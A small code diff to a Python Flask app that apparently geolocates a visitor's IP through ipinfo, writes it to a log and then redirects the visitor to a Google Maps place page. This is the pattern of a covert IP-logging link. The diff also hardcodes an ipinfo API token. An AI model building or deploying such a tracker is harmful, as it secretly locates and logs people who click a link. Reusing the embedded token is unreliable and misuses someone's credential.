@@ -7,8 +7,8 @@ import os
 
 app = Flask(__name__)
 
-IPINFO_TOKEN = "9bc48d8ba04675"
-LOG_FILE = "flask_geo_redirect.jsonl"  # Упростил путь для совместимости
+IPINFO_TOKEN = "9bc48d8ba04675"  # замените на свой токен
+LOG_FILE = "flask_geo_redirect.jsonl"
 
 def geolocate(ip):
     try:
@@ -59,7 +59,7 @@ def redirector():
 
     print("[LOG ENTRY]", log_line)
 
-    return redirect("https://www.google.com/maps/place/%D0%92%D0%B8%D0%BB%D0%BB%D0%B0...")
+    return redirect("https://www.google.com/maps/place/Вилла...")
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
